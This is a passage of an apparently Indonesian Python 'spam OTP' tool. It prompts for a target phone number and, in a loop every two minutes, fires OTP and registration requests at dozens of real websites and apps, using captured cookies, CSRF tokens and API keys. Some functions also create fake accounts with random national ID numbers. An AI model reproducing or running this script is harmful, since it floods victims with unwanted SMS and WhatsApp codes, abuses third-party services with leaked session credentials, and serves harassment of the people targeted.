  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://member.els.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://member.els.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.838671011.1787470004; _ga=GA1.1.682741423.1787470005; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fels.id%2F; cf_clearance=u6Yw53DFZSn56DwrIlr_ZxIJ9QfqwnH2LibY8_8COnI-1787470010-1.2.1.1-_Yzp10QlUiRV7_dM.hIBu_eQ3j3H1PjSGu1muhrB4u_RL0xoU8qhCyhl.N3cRybkTtmjWUhDR67gbn9HDIdr00a2BrABvmCMw8UEUo0e0aU2M3I9tnuq6rNMdEyNQm4Xba4pBLulS543BCbF.BGwHOhtvHDuLDN5acRtj9dibyAytzGMrvioCMqvNZxo7yxNb2YWZSjJdkyGp9kAwNCxYNl5_1JQFV7BxjNGKWwjsYxwxR.V1NU6M6X60TAIR5e9PLg2EvtnobHKN0BN2L__rm21D8d32j1hU0zbYeg5dAYipblrEk6X1JwYTUMSoO1bxZ8nJOFpq.HJ.1.QBfBb9nzY7jioh7dIdfxkoJ9I73s; _ga_E3DHK5EHFD=GS2.1.s1787470004$o1$g1$t1787470057$j7$l0$h0; ESODA_ELS_MEMBERSHIP=4612f1cd046264b1e30adf495e046db0; _ga_JT6HY1CYT1=GS2.1.s1787470070$o1$g0$t1787470071$j59$l0$h0' \\
  -d '{{"name":"{name}","mobilephone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_babyhappy(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://club.babyhappydiapers.com/api/registration/resend-otp-phone' \\
  -H 'host: club.babyhappydiapers.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://club.babyhappydiapers.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://club.babyhappydiapers.com/registration' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.1607778853.1787457141; _ga=GA1.1.345266246.1787457141; _tt_enable_cookie=1; _ttp=01M0PBZ2G221DTCR2TCZP9NR5J_.tt.1; _fbp=fb.1.1787457144780.679918106559872972.AQYAAQIB; ttcsid_D6J6BNRC77UCPJEO2GU0=1787457145405::yZHNrp369Xay2lZSg8Ah.1.1787457156785.1; cphone={phone}; _gcl_gs=2.1.k1$i1787457792$u37029106; _gcl_aw=GCL.1787457796.CjwKCAjwkaXUBhASEiwAZI3ds8_i9ubY7AiAmkjJ6S2JxDvkIP3eWg1n09EdLYlRyHm_otGZPRiQOxoCOH0QAvD_BwE; ttcsid=1787457145411::Ue7LBTLOfkm-jeYclKyU.1.1787457846118.0::1.670669.651725::700582.25.326.828::685893.16.125; ttcsid_D7SQ6T3C77U4TTGIHFM0=1787457145433::EJ3SqZp4PDfpKlkAnNZT.1.1787457846120.1; _ga_KKVZ5M822G=GS2.1.s1787457141$o1$g1$t1787457846$j9$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_pkumayong(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
  -H 'host: reservasi.pkumayong.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://reservasi.pkumayong.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://reservasi.pkumayong.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D; laravel_session=eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw '_token=VNbW1nBJZCtIWp0264iC0O2ao5qVpGRCpX9UW1NW&nohp={phone}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_unpatti(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        import random
        import string
        
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f"{name}{random.randint(100,999)}@gmail.com"
        nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=16))
        
        curl_cmd = f"""curl -s -X POST 'https://mandiri.pmb.unpatti.ac.id/api/v1/register/request-otp' \\
  -H 'host: mandiri.pmb.unpatti.ac.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://mandiri.pmb.unpatti.ac.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://mandiri.pmb.unpatti.ac.id/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -d '{{"nama":"{name}","email":"{email}","no_telp":"{phone}","nik":"{nik}","tanggal_lahir":"2002-09-11","password":"{password}","password_confirmation":"{password}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_starlite(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://starliteindonesia.com/api/customer-registration/phone-otp/request' \\
  -H 'host: starliteindonesia.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'x-api-key: 280999!FTTH' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://starliteindonesia.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://starliteindonesia.com/?register=active' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.688980367.1787486216; _gcl_au=1.1.1809383858.1787486217; _fbp=fb.1.1787486217519.84569997662616804; _tt_enable_cookie=1; _ttp=01M0Q7P9JFTT6QXYBSCJ02DM2B_.tt.1; _ga_1ST28GMNXL=GS2.1.s1787486216$o1$g1$t1787486240$j36$l0$h0; _ga_DFWC1L1VBM=GS2.1.s1787486218$o1$g1$t1787486240$j38$l0$h0; ttcsid=1787486217851::Tc3BK0KkD3xGc2Lw3-TR.1.1787486318913.0::1.12616.0::100794.12.441.383::0.0.0; ttcsid_D6N6GJRC77U5VG9U4DSG=1787486217846::JJVvUOjr14dqXefVXgI6.1.1787486318914.1' \\
  -d '{{"phone_number":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_ykkipeduli(nomor):
    try:
        if phone.startswith("0"):
            phone = phone[1:]
            phone = "62" + phone
        elif phone.startswith("62"):
            phone = phone
        elif phone.startswith("+62"):
            phone = phone[3:]
            phone = "62" + phone
        else:
            phone = "62" + phone
        
        email = f"user{int(time.time())}{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}@gmail.com"
        
        curl_cmd = f"""curl -s -X POST 'https://ykkipeduli.org/register/sahabat/send-otp' \\
  -H 'host: ykkipeduli.org' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: 2mxUxQy8CxToMdYQwQzsIvNM4uhIsyGLwwcaUpB0' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://ykkipeduli.org' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://ykkipeduli.org/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6IkJ1NGxNSERac0M2WWR5eElhbkU4WEE9PSIsInZhbHVlIjoiQzJwM0xveXcrU2Y0eXkrY2JkTFEyWm15YVhRbzNYWkF3WDQ5MmtLczBCc1Y4NHhjQi9mU3ZPQTVaVUJNdWFZZ2hrSHFKUFdwK0dDT25VS1ovcDNSL1NoeDVWV3NIY2NuekhjeGVpc1FDb2U1cjNZTHRYZ1V3bGJPWEFjQXRXS1IiLCJtYWMiOiI2YjAxNjRkNmZkN2M0YTc3NDUwNDgyOTRiZTQ0MzYzOTM4M2FmODAxOGViMGYxYjQzYzAyY2E2ZTRlZDg0NjJhIiwidGFnIjoiIn0%3D; ykki-session=eyJpdiI6Imx4dFpJZnNwbGN6S3FFMm9maEZta2c9PSIsInZhbHVlIjoiQXRsWC9xMm5KaTVqUTAzYlNTckNnYlIxc1dML2xVOFljSzlzK1ZQK3Z5RkJHZzRKL3VNQlNNN0JwZm02RGs1SHlTNVUrallueDRrc3o3aEZMVDNKaE9iR1lmT2NBdXdwQ3FCd0paT2psNEx4YkV3ZDRQcDEwMDlIYjZQQVNhTDkiLCJtYWMiOiI1M2VkYjBkY2M2ZTQzOTE2YzZlYWYxNDAzMmNmOGIzYjliMWQwNzcxZmM4YjI2NTc1ZTNhNzg3NWUxMGY3NjMxIiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  -d '{{"name":"testimoni","phone":"{phone}","email":"{email}","password":"5fnzSTRcW38wBNG","password_confirmation":"5fnzSTRcW38wBNG","account_type":"donatur"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False  

def spam_otp_jogjakita(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        session = requests.Session()
        headers_token = {
            'Authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        data_token = {'grant_type': 'client_credentials', 'uuid': '00000000-0000-0000-0000-000000000000', 'id_user': '0', 'id_kota': '0', 'location': '0.0,0.0', 'via': 'jogjakita_user', 'version_code': '501', 'version_name': '6.10.1'}
        resp_token = session.post('https://aci-user.bmsecure.id/oauth/token', data=data_token, headers=headers_token, timeout=10)
        token_data = resp_token.json()
        access_token = token_data.get('access_token')
        if not access_token:
            return False
        headers_otp = {'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {access_token}', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        random_uuid = f'{uuid.uuid4()}{uuid.uuid4().hex[:8]}'
        data_otp = {'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakarta_user'}, 'uuid': random_uuid, 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakarta_user'}
        resp_otp = session.post('https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send', json=data_otp, headers=headers_otp, timeout=10)
        otp_data = resp_otp.json()
        return str(otp_data.get('rc')) == '200'
    except:
        return False

def spam_otp_eiger(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = '62' + raw[1:]
        elif not raw.startswith('62'):
            raw = '62' + raw
        register_phone = raw
        formatted_phone = f'+{raw}'
        random_email = f'{random.randint(100000, 999999)}@gmail.com'
        session = requests.Session()
        register_payload = {'name': 'Yanto', 'email': random_email, 'mobile_phone': register_phone, 'password': 'Yanto123@', 'password_confirmation': 'Yanto123@', 'accept_privacy_policy': True, 'g-recaptcha-response': '', 'type': 'web'}
        session.post('https://careloyalty.eigerindo.co.id/api/v1/register', json=register_payload, headers={'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}, timeout=10)
        otp_resp = session.post('https://careloyalty.eigerindo.co.id/api/v1/otp/send', json={'mobile_phone': formatted_phone, 'via': 'whatsapp'}, headers={'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}, timeout=10)
        return otp_resp.status_code in (200, 201, 204)
    except:
        return False
                                                            
def mulai_spam(nomor):
    apis = {
        'im3': spam_otp_im3,
        'singa3': spam_otp_singa_v3,
        'singa4': spam_otp_singa_v4,
        'singa5': spam_otp_singa_v5,
        'ktakilat': spam_otp_ktakilat,
        'uangme': spam_otp_uangme,
        'tokopedia': spam_otp_tokopedia,
        'duniagames': spam_otp_duniagames,
        'yogyaonline': spam_otp_yogyaonline,
        'bantusaku': spam_otp_bantusaku,
        'kreditpintar': spam_otp_kreditpintar,
        'maulagi': spam_otp_maulagi,
        'byu': spam_otp_byu,
        'vedantu': spam_otp_vedantu,
        'swiggy': spam_otp_swiggy,
        'internetrakyat': spam_otp_internetrakyat,
        'pinjamduit': spam_otp_pinjamduit,
        'misteraladin': spam_otp_misteraladin,
        'halodoc': spam_otp_halodoc,
        'greensm': spam_otp_greensm,
        'tiptip': spam_otp_tiptip,
        'labamu': spam_otp_labamu,
        'kitabisa': spam_otp_kitabisa_wea,
        'uku': spam_otp_uku,
        'toyota': spam_otp_toyota,
        'nutriclub': spam_otp_nutriclub,
        'oyorooms': spam_otp_oyorooms,
        'acc': spam_otp_acc,
        'carro': spam_otp_carro,
        'joob': spam_otp_joob,
        'buccheri': spam_otp_buccheri,
        'generasimaju': spam_otp_generasimaju,
        'els': spam_otp_els,
        'babyhappy': spam_otp_babyhappy,
        'pkumayong': spam_otp_pkumayong,
        'unpatti': spam_otp_unpatti,
        'starlite': spam_otp_starlite,
        'ykkipeduli': spam_otp_ykkipeduli,
        'jogjakita': spam_otp_jogjakita,
        'eiger': spam_otp_eiger,
    }
    for nama_api, fungsi_api in apis.items():
        try:
            fungsi_api(nomor)
        except:
            pass
        time.sleep(1)
              
SESSION_FILE = os.path.expanduser("~/session.json")
OWNER_NUMBERS = ['6285800881164']

def is_owner_number(nomor):
    return nomor in OWNER_NUMBERS

def simpan_sesi(nomor, waktu_kirim):
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump({'nomor': nomor, 'waktu_kirim': waktu_kirim}, f)
    except:
        pass

def baca_sesi():
    try:
        with open(SESSION_FILE, 'r') as f:
            return json.load(f)
    except:
        return None

def hapus_sesi():
    try:
        os.remove(SESSION_FILE)
    except:
        pass

def spam_countdown(waktu_kirim, durasi=120):
    while True:
        sisa = durasi - int(time.time() - waktu_kirim)
        if sisa <= 0:
            break
        menit = sisa // 60
        detik_sisa = sisa % 60
        waktu = f"{menit:02d}:{detik_sisa:02d}"
        sys.stdout.write(f'\r{m}=================================\n')
        sys.stdout.write(f"{h}Cooldown 2 menit : {waktu}{c}\n")
        sys.stdout.write(f'{m}================================={c}')
        sys.stdout.flush()
        sys.stdout.write('\x1b[2A')
        time.sleep(1)
    sys.stdout.write('\n\n')

def loading_animasi(detik=1, teks="Loading..."):
    animasi = ['\\', '|', '/', '-']
    for i in range(detik * 10):
        sys.stdout.write(f'\r{teks} {animasi[i % 4]}')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 30 + '\r')
    sys.stdout.flush()

def spam_otp_main():
    os.system("clear")
    print()
    print(f"\033[33;1m Developer : Thxyzz404")
    print()
    loading_animasi(1, "Memuat")
    print(f'{h} Masukkan Nomor Target : 08XXX ')
    nomor = input(f'{c} : ').strip()
    print()
    if nomor:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        if is_owner_number(nomor):
            print(f'\n{m}MAU NGAPAIN KOCAK 😂😂{c}')
            input(f'\n{k}Tekan Enter untuk kembali...{c}')
            return None
        
        update_leaderboard(1)
        kirim_log_aktivitas('1 - Spam1', nomor)
        try:
            sesi = baca_sesi()
            if sesi:
                waktu_kirim = sesi.get('waktu_kirim')
                sisa = 120 - int(time.time() - waktu_kirim)
                if sesi.get('nomor') == nomor and (sisa > 0):
                    spam_countdown(waktu_kirim, 120)
            while True:
                update_leaderboard(1)
                kirim_log_aktivitas('1 - Spam2', nomor)
                animasi = ['\\', '|', '/', '-']
                i = 0
                stop_animasi = False                
                def jalanin_animasi():
                    nonlocal i, stop_animasi
                    while not stop_animasi:
                        sys.stdout.write(f'\rMengirim spam... {animasi[i % 4]}')
                        sys.stdout.flush()
                        time.sleep(0.1)
                        i += 1                
                animasi_thread = threading.Thread(target=jalanin_animasi)
                animasi_thread.daemon = True
                animasi_thread.start()
                mulai_spam(nomor)         
                stop_animasi = True
                animasi_thread.join(timeout=0.5)               
                sys.stdout.write('\r' + ' ' * 50 + '\r')
                sys.stdout.flush()                
                waktu_kirim = time.time()
                simpan_sesi(nomor, waktu_kirim)
                spam_countdown(waktu_kirim, 120)
                hapus_sesi()
        except KeyboardInterrupt:
            sys.stdout.write('\n\n\n\n')
            print(f'\n{k} Kembali...')
            time.sleep(1)
    else:
        input(f'{m} Nomor jangan kosong...')
        return None

if __name__ == "__main__":
    spam_otp_main()